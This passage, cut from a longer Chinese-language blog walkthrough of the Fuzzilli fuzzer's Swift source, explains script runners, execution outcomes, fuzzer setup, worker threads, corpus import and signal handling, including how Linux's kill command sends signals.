class="hljs-comment">// Will be called after the fuzzer is initialized and able to execute programs.</span><br>    <span class="hljs-comment">// This is a good time to install event handlers, execute programs for setup, etc.</span><br>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">initialize</span>() &#123;<br>        <span class="hljs-comment">// To be implemented by child classes.</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面ScriptRunner是脚本运行器，也是一种组件，提供了一个run函数代表执行脚本，同时也提供了一个函数用于设置子进程的环境</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">protocol</span> <span class="hljs-title class_">ScriptRunner</span>: <span class="hljs-title class_">Component</span> &#123;<br>    <span class="hljs-keyword">var</span> processArguments: [<span class="hljs-type">String</span>] &#123; <span class="hljs-keyword">get</span> &#125;<br><br>    <span class="hljs-comment">/// Executes a script, waits for it to complete, and returns the result.</span><br>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">run</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">script</span>: <span class="hljs-type">String</span>, <span class="hljs-params">withTimeout</span> <span class="hljs-params">timeout</span>: <span class="hljs-type">UInt32</span>) -&gt; <span class="hljs-type">Execution</span><br><br>    <span class="hljs-comment">/// Sets an environment variable for the child process. Must only be called before initialization.</span><br>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">setEnvironmentVariable</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">key</span>: <span class="hljs-type">String</span>, <span class="hljs-params">to</span> <span class="hljs-params">value</span>: <span class="hljs-type">String</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a>Execution</h3><p>下面主要是定义程序执行的结果，包括执行成功、执行失败、出现crash和超时等情况：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">/// The possible outcome of a program execution.</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">ExecutionOutcome</span>: <span class="hljs-title class_">CustomStringConvertible</span>, <span class="hljs-title class_">Equatable</span>, <span class="hljs-title class_">Hashable</span> &#123;<br>    <span class="hljs-keyword">case</span> crashed(<span class="hljs-type">Int</span>)<br>    <span class="hljs-keyword">case</span> failed(<span class="hljs-type">Int</span>)<br>    <span class="hljs-keyword">case</span> succeeded<br>    <span class="hljs-keyword">case</span> timedOut<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> description: <span class="hljs-type">String</span> &#123;<br>        <span class="hljs-keyword">switch</span> <span class="hljs-keyword">self</span> &#123;<br>        <span class="hljs-keyword">case</span> .crashed(<span class="hljs-keyword">let</span> signal):<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Crashed (signal <span class="hljs-subst">\(signal)</span>)&quot;</span><br>        <span class="hljs-keyword">case</span> .failed(<span class="hljs-keyword">let</span> exitcode):<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Failed (exit code <span class="hljs-subst">\(exitcode)</span>)&quot;</span><br>        <span class="hljs-keyword">case</span> .succeeded:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Succeeded&quot;</span><br>        <span class="hljs-keyword">case</span> .timedOut:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;TimedOut&quot;</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">isCrash</span>() -&gt; <span class="hljs-type">Bool</span> &#123;<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">case</span> .crashed <span class="hljs-operator">=</span> <span class="hljs-keyword">self</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/// The result of executing a program.</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">protocol</span> <span class="hljs-title class_">Execution</span> &#123;<br>    <span class="hljs-comment">/// The execution outcome</span><br>    <span class="hljs-keyword">var</span> outcome: <span class="hljs-type">ExecutionOutcome</span> &#123; <span class="hljs-keyword">get</span> &#125;<br><br>    <span class="hljs-comment">/// The program&#x27;s stdout</span><br>    <span class="hljs-keyword">var</span> stdout: <span class="hljs-type">String</span> &#123; <span class="hljs-keyword">get</span> &#125;<br><br>    <span class="hljs-comment">/// The program&#x27;s stderr</span><br>    <span class="hljs-keyword">var</span> stderr: <span class="hljs-type">String</span> &#123; <span class="hljs-keyword">get</span> &#125;<br><br>    <span class="hljs-comment">/// The program&#x27;s FuzzIL output</span><br>    <span class="hljs-keyword">var</span> fuzzout: <span class="hljs-type">String</span> &#123; <span class="hljs-keyword">get</span> &#125;<br><br>    <span class="hljs-comment">/// Execution time in microseconds</span><br>    <span class="hljs-keyword">var</span> execTime: <span class="hljs-type">TimeInterval</span> &#123; <span class="hljs-keyword">get</span> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Fuzzer类"><a href="#Fuzzer类" class="headerlink" title="Fuzzer类"></a>Fuzzer类</h3><p>这里也只是列出Fuzzer类的部分定义，makeFuzzer函数中调用Fuzzer的构造函数其实就是初始化它成员的内容</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fuzzer</span> &#123;<br>    <span class="hljs-comment">/// Id of this fuzzer.</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> id: <span class="hljs-type">UUID</span><br><br>    <span class="hljs-comment">/// Has this fuzzer been initialized?</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">private(set)</span> <span class="hljs-keyword">var</span> isInitialized <span class="hljs-operator">=</span> <span class="hljs-literal">false</span><br><br>    <span class="hljs-comment">/// Has this fuzzer been stopped?</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">private(set)</span> <span class="hljs-keyword">var</span> isStopped <span class="hljs-operator">=</span> <span class="hljs-literal">false</span><br><br>    <span class="hljs-comment">/// The configuration used by this fuzzer.</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> config: <span class="hljs-type">Configuration</span><br><br>    <span class="hljs-comment">/// The list of events that can be dispatched on this fuzzer instance.</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> events: <span class="hljs-type">Events</span><br><br>    <span class="hljs-comment">/// Timer API for this fuzzer.</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> timers: <span class="hljs-type">Timers</span><br><br>    <span class="hljs-comment">/// The script runner used to execute generated scripts.</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> runner: <span class="hljs-type">ScriptRunner</span><br><br>    <span class="hljs-comment">/// The fuzzer engine producing new programs from existing ones and executing them.</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">private(set)</span> <span class="hljs-keyword">var</span> engine: <span class="hljs-type">FuzzEngine</span><br>    <span class="hljs-comment">/// During initial corpus generation, the current engine will be a GenerativeEngine while this will keep a reference to the &quot;real&quot; engine to use after corpus generation.</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> nextEngine: <span class="hljs-type">FuzzEngine</span>?<br><br>    <span class="hljs-comment">/// The active code generators. It is possible to change these (temporarily) at runtime. This is e.g. done by some ProgramTemplates.</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> codeGenerators: <span class="hljs-type">WeightedList</span>&lt;<span class="hljs-type">CodeGenerator</span>&gt;<br><br>    <span class="hljs-comment">/// The active program templates. These are only used if the HybridEngine is enabled.</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> programTemplates: <span class="hljs-type">WeightedList</span>&lt;<span class="hljs-type">ProgramTemplate</span>&gt;<br><br>    <span class="hljs-comment">/// The mutators used by the engine.</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> mutators: <span class="hljs-type">WeightedList</span>&lt;<span class="hljs-type">Mutator</span>&gt;<br><br>    <span class="hljs-comment">/// The evaluator to score generated programs.</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> evaluator: <span class="hljs-type">ProgramEvaluator</span><br><br>    <span class="hljs-comment">/// The model of the target environment.</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> environment: <span class="hljs-type">Environment</span><br><br>    <span class="hljs-comment">/// The lifter to translate FuzzIL programs to the target language.</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> lifter: <span class="hljs-type">Lifter</span><br><br>    <span class="hljs-comment">/// The corpus of &quot;interesting&quot; programs found so far.</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> corpus: <span class="hljs-type">Corpus</span><br><br>    <span class="hljs-comment">/// The minimizer to shrink programs that cause crashes or trigger new interesting behaviour.</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> minimizer: <span class="hljs-type">Minimizer</span><br></code></pre></td></tr></table></figure><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>先看下Fuzzer::sync函数，即调用了DispatchQueue的sync函数</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">/// Schedule work on this fuzzer&#x27;s dispatch queue and wait for its completion.</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">sync</span>(<span class="hljs-params">do</span> <span class="hljs-params">block</span>: () -&gt; ()) &#123;<br>    queue.sync &#123;<br>        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span><span class="hljs-keyword">self</span>.isStopped <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">return</span> &#125;<br>        block()<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面主要是采用同步操作进行添加模块和初始化操作</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">// 创建一个fuzzer</span><br><span class="hljs-keyword">let</span> fuzzer <span class="hljs-operator">=</span> makeFuzzer(for: profile, with: config)<br><span class="hljs-comment">// Create a &quot;UI&quot;. We do this now, before fuzzer initialization, so</span><br><span class="hljs-comment">// we are able to print log messages generated during initialization.</span><br><span class="hljs-comment">// ui是显示fuzz的页面</span><br><span class="hljs-keyword">let</span> ui <span class="hljs-operator">=</span> <span class="hljs-type">TerminalUI</span>(for: fuzzer)<br><span class="hljs-comment">// Remaining fuzzer initialization must happen on the fuzzer&#x27;s dispatch queue.</span><br><span class="hljs-comment">// 下面通过同步操作进行，主线程等待下面block执行完成才继续；主要添加一些模块</span><br>fuzzer.sync &#123;<br>    <span class="hljs-comment">// Always want some statistics.</span><br>    fuzzer.addModule(<span class="hljs-type">Statistics</span>())<br><br><span class="hljs-operator">...</span><br><span class="hljs-operator">...</span><br>    <span class="hljs-comment">// Exit this process when the main fuzzer stops.</span><br>    fuzzer.registerEventListener(for: fuzzer.events.<span class="hljs-type">ShutdownComplete</span>) &#123; reason <span class="hljs-keyword">in</span><br>        exit(reason.toExitCode())<br>    &#125;<br><br>    <span class="hljs-comment">// Initialize the fuzzer, and run startup tests</span><br>    fuzzer.initialize()<br>    fuzzer.runStartupTests()<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h3><p>根据提供的jobs来创建对应的fuzz线程，默认就一个主线程</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">var</span> instances <span class="hljs-operator">=</span> [fuzzer]<br><span class="hljs-keyword">for</span> <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span> <span class="hljs-number">1</span><span class="hljs-operator">..&lt;</span>numJobs &#123;<br>    <span class="hljs-keyword">let</span> worker <span class="hljs-operator">=</span> makeFuzzer(for: profile, with: config)<br>    instances.append(worker)<br>    <span class="hljs-keyword">let</span> g <span class="hljs-operator">=</span> <span class="hljs-type">DispatchGroup</span>()<br><br>    g.enter()<br>    worker.sync &#123;<br>        worker.addModule(<span class="hljs-type">Statistics</span>())<br>        worker.addModule(<span class="hljs-type">ThreadWorker</span>(forMaster: fuzzer))<br>        worker.registerEventListener(for: worker.events.<span class="hljs-type">Initialized</span>) &#123; g.leave() &#125;<br>        worker.initialize()<br>    &#125;<br><br>    <span class="hljs-comment">// Wait for the worker to be fully initialized</span><br>    g.wait()<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="导入语料库"><a href="#导入语料库" class="headerlink" title="导入语料库"></a>导入语料库</h3><p>下面的操作都是围绕用户提供的特定类型的路径，通过特定的操作来导入语料库</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs swift">fuzzer.sync &#123;<br>    <span class="hljs-keyword">func</span> <span class="hljs-title function_">loadCorpus</span>(<span class="hljs-params">from</span> <span class="hljs-params">dirPath</span>: <span class="hljs-type">String</span>) -&gt; [<span class="hljs-type">Program</span>] &#123;<br>        <span class="hljs-keyword">var</span> isDir: <span class="hljs-type">ObjCBool</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-operator">!</span><span class="hljs-type">FileManager</span>.default.fileExists(atPath: dirPath, isDirectory:<span class="hljs-operator">&amp;</span>isDir) <span class="hljs-operator">||</span> <span class="hljs-operator">!</span>isDir.boolValue &#123;<br>            logger.fatal(<span class="hljs-string">&quot;Cannot import programs from <span class="hljs-subst">\(dirPath)</span>, it is not a directory!&quot;</span>)<br>        &#125;<br><br>        <span class="hljs-keyword">var</span> programs <span class="hljs-operator">=</span> [<span class="hljs-type">Program</span>]()<br>        <span class="hljs-keyword">let</span> fileEnumerator <span class="hljs-operator">=</span> <span class="hljs-type">FileManager</span>.default.enumerator(atPath: dirPath)<br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">let</span> filename <span class="hljs-operator">=</span> fileEnumerator<span class="hljs-operator">?</span>.nextObject() <span class="hljs-keyword">as?</span> <span class="hljs-type">String</span> &#123;<br>            <span class="hljs-keyword">guard</span> filename.hasSuffix(<span class="hljs-string">&quot;.fuzzil.protobuf&quot;</span>) <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">continue</span> &#125;<br>            <span class="hljs-keyword">let</span> path <span class="hljs-operator">=</span> dirPath <span class="hljs-operator">+</span> <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-operator">+</span> filename<br>            <span class="hljs-keyword">do</span> &#123;<br>                <span class="hljs-keyword">let</span> data <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-type">Data</span>(contentsOf: <span class="hljs-type">URL</span>(fileURLWithPath: path))<br>                <span class="hljs-keyword">let</span> pb <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-type">Fuzzilli_Protobuf_Program</span>(serializedData: data)<br>                <span class="hljs-keyword">let</span> program <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-type">Program</span>.<span class="hljs-keyword">init</span>(from: pb)<br>                programs.append(program)<br>            &#125; <span class="hljs-keyword">catch</span> &#123;<br>                logger.error(<span class="hljs-string">&quot;Failed to load program <span class="hljs-subst">\(path)</span>: <span class="hljs-subst">\(error)</span>. Skipping&quot;</span>)<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> programs<br>    &#125;<br><br>    <span class="hljs-comment">// Resume a previous fuzzing session if requested</span><br>    <span class="hljs-keyword">if</span> resume, <span class="hljs-keyword">let</span> path <span class="hljs-operator">=</span> storagePath &#123;<br>        logger.info(<span class="hljs-string">&quot;Resuming previous fuzzing session. Importing programs from corpus directory now. This may take some time&quot;</span>)<br>        <span class="hljs-keyword">let</span> corpus <span class="hljs-operator">=</span> loadCorpus(from: path <span class="hljs-operator">+</span> <span class="hljs-string">&quot;/old_corpus&quot;</span>)<br><br>        <span class="hljs-comment">// Delete the old corpus directory now</span><br>        <span class="hljs-keyword">try?</span> <span class="hljs-type">FileManager</span>.default.removeItem(atPath: path <span class="hljs-operator">+</span> <span class="hljs-string">&quot;/old_corpus&quot;</span>)<br><br>        fuzzer.importCorpus(corpus, importMode: .interestingOnly(shouldMinimize: <span class="hljs-literal">false</span>))  <span class="hljs-comment">// We assume that the programs are already minimized</span><br>        logger.info(<span class="hljs-string">&quot;Successfully resumed previous state. Corpus now contains <span class="hljs-subst">\(fuzzer.corpus.size)</span> elements&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-comment">// Import a full corpus if requested</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> path <span class="hljs-operator">=</span> corpusImportAllPath &#123;<br>        <span class="hljs-keyword">let</span> corpus <span class="hljs-operator">=</span> loadCorpus(from: path)<br>        logger.info(<span class="hljs-string">&quot;Starting All-corpus import of <span class="hljs-subst">\(corpus.count)</span> programs. This may take some time&quot;</span>)<br>        fuzzer.importCorpus(corpus, importMode: .all)<br>        logger.info(<span class="hljs-string">&quot;Successfully imported <span class="hljs-subst">\(path)</span>. Corpus now contains <span class="hljs-subst">\(fuzzer.corpus.size)</span> elements&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-comment">// Import a coverage-only corpus if requested</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> path <span class="hljs-operator">=</span> corpusImportCovOnlyPath &#123;<br>        <span class="hljs-keyword">var</span> corpus <span class="hljs-operator">=</span> loadCorpus(from: path)<br>        <span class="hljs-comment">// Sorting the corpus helps avoid minimizing large programs that produce new coverage due to small snippets also included by other, smaller samples</span><br>        corpus.sort(by: &#123; <span class="hljs-variable">$0</span>.size <span class="hljs-operator">&lt;</span> <span class="hljs-variable">$1</span>.size &#125;)<br>        logger.info(<span class="hljs-string">&quot;Starting Cov-only corpus import of <span class="hljs-subst">\(corpus.count)</span> programs. This may take some time&quot;</span>)<br>        fuzzer.importCorpus(corpus, importMode: .interestingOnly(shouldMinimize: <span class="hljs-literal">true</span>))<br>        logger.info(<span class="hljs-string">&quot;Successfully imported <span class="hljs-subst">\(path)</span>. Samples will be added to the corpus once they are minimized&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-comment">// Import and merge an existing corpus if requested</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> path <span class="hljs-operator">=</span> corpusImportMergePath &#123;<br>        <span class="hljs-keyword">let</span> corpus <span class="hljs-operator">=</span> loadCorpus(from: path)<br>        logger.info(<span class="hljs-string">&quot;Starting corpus merge of <span class="hljs-subst">\(corpus.count)</span> programs. This may take some time&quot;</span>)<br>        fuzzer.importCorpus(corpus, importMode: .interestingOnly(shouldMinimize: <span class="hljs-literal">false</span>))<br>        logger.info(<span class="hljs-string">&quot;Successfully imported <span class="hljs-subst">\(path)</span>. Corpus now contains <span class="hljs-subst">\(fuzzer.corpus.size)</span> elements&quot;</span>)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="信号监听"><a href="#信号监听" class="headerlink" title="信号监听"></a>信号监听</h3><p>下面主要是对终止Fuzzer的信号进行一个处理，收到Fuzzer终止的信号时会调用fuzzer的shutdown方法，这样可以保证终止Fuzzer前可以保存数据。</p><p>下面signal(sig, SIG_IGN)先是忽略之前对于sig的处理方法，然后自定义自己的处理，这是为了防止影响或者出错</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">// Install signal handlers to terminate the fuzzer gracefully.</span><br><span class="hljs-keyword">var</span> signalSources: [<span class="hljs-type">DispatchSourceSignal</span>] <span class="hljs-operator">=</span> []<br><span class="hljs-keyword">for</span> sig <span class="hljs-keyword">in</span> [<span class="hljs-type">SIGINT</span>, <span class="hljs-type">SIGTERM</span>] &#123;<br>    <span class="hljs-comment">// Seems like we need this so the dispatch sources work correctly?</span><br>    signal(sig, <span class="hljs-type">SIG_IGN</span>)<br><br>    <span class="hljs-keyword">let</span> source <span class="hljs-operator">=</span> <span class="hljs-type">DispatchSource</span>.makeSignalSource(signal: sig, queue: <span class="hljs-type">DispatchQueue</span>.main)<br>    source.setEventHandler &#123;<br>        fuzzer.async &#123;<br>            fuzzer.shutdown(reason: .userInitiated)<br>        &#125;<br>    &#125;<br>    source.activate()<br>    signalSources.append(source)<br>&#125;<br></code></pre></td></tr></table></figure><p>下面的代码是在非Windows平台下生效的，主要就是处理SIGUSR1信号。这个信号在这里是打印下一个生成的程序。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">#if</span> <span class="hljs-operator">!</span>os(<span class="hljs-type">Windows</span>)<br><span class="hljs-comment">// Install signal handler for SIGUSR1 to print the next program that is generated.</span><br>signal(<span class="hljs-type">SIGUSR1</span>, <span class="hljs-type">SIG_IGN</span>)<br><span class="hljs-keyword">let</span> source <span class="hljs-operator">=</span> <span class="hljs-type">DispatchSource</span>.makeSignalSource(signal: <span class="hljs-type">SIGUSR1</span>, queue: <span class="hljs-type">DispatchQueue</span>.main)<br>source.setEventHandler &#123;<br>    ui.printNextGeneratedProgram <span class="hljs-operator">=</span> <span class="hljs-literal">true</span><br>&#125;<br>source.activate()<br>signalSources.append(source)<br><span class="hljs-keyword">#endif</span><br></code></pre></td></tr></table></figure><p>上面提到三个信号SIGINT、SIGTERM和SIGUSR1</p><blockquote><p>下面两个是用来终止程序的：</p><p>SIGINT是Interrupt</p><p>SIGTERM是Terminate</p><p>下面的这个是用户自定义信号，这个信号是需要用户手动发送的，针对这个信号的处理也是需要用户自定义，通常用于调试代码的信息：</p><p>SIGUSR</p></blockquote><h4 id="关于发送信号"><a href="#关于发送信号" class="headerlink" title="关于发送信号"></a>关于发送信号</h4><p>在此，需要重新介绍一下在Linux下常用到的一个指令<code>kill</code>，因为大多数用这个指令都是杀进程的：</p><blockquote><p>注意：kill的主要功能是向进程发送信号的工具</p><p><strong>kill命令</strong> 是一个在Linux&#x2F;Unix系统中非常常用的命令行工具，它的主要功能是向一个或多个进程发送信号，从而控制这些进程的行为。</p><p>使用<strong>kill pid</strong>命令的默认信号选项是<strong>SIGTERM</strong></p><p><strong>SIGKILL (9)：</strong> 这个信号是无法被忽略或捕获的，它会强制终止进程。</p><p><strong>SIGTERM (15)：</strong> 这个信号通常用于请求进程正常退出，但进程可以选择忽略或处理这个信号。</p><p>所以默认的<strong>kill pid</strong>可能杀不掉进程，使用<strong>kill -9或者kill -SIGKILL pid</strong>可以强制终止</p><p>上面三个信号我们都可以使用kill进行发送，对于<strong>SIGINT</strong>我们也可以通过<strong>Ctrl + C</strong>来发送</p></blockquote><h3 id="开始运行"><a href="#开始运行" class="headerlink" title="开始运行"></a>开始运行</h3><p>先看下Fuzzer的构造函数：</p><p>这里主要关注queue，每个Fuzzer实例都会创建一个任务队列，并且Fuzzer中还定义了同步执行sync和异步执行async，我们可以通过一个Fuzzer的实例fuzzer来分发任务，比如fuzzer.sync{…}就是将block中的内容放到该fuzzer的队列中进行同步执行。</p><p><code>DispatchQueue(label: &quot;Fuzzer \(uniqueId)&quot;, target: DispatchQueue.global())</code>创建一个队列，其标识符为通过label设置。</p><p><strong>target:</strong> 指定了这个队列的任务将被提交到的目标队列。这里使用了 <code>DispatchQueue.global()</code>，表示任务将被提交到全局并发队列中执行。全局并发队列是系统提供的，可以并行执行多个任务。提交到全局并发队列中，就可以和其他任务进行争夺计算资源。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">init</span>(<br>    <span class="hljs-params">configuration</span>: <span class="hljs-type">Configuration</span>, <span class="hljs-params">scriptRunner</span>: <span class="hljs-type">ScriptRunner</span>, <span class="hljs-params">engine</span>: <span class="hljs-type">FuzzEngine</span>, <span class="hljs-params">mutators</span>: <span class="hljs-type">WeightedList</span>&lt;<span 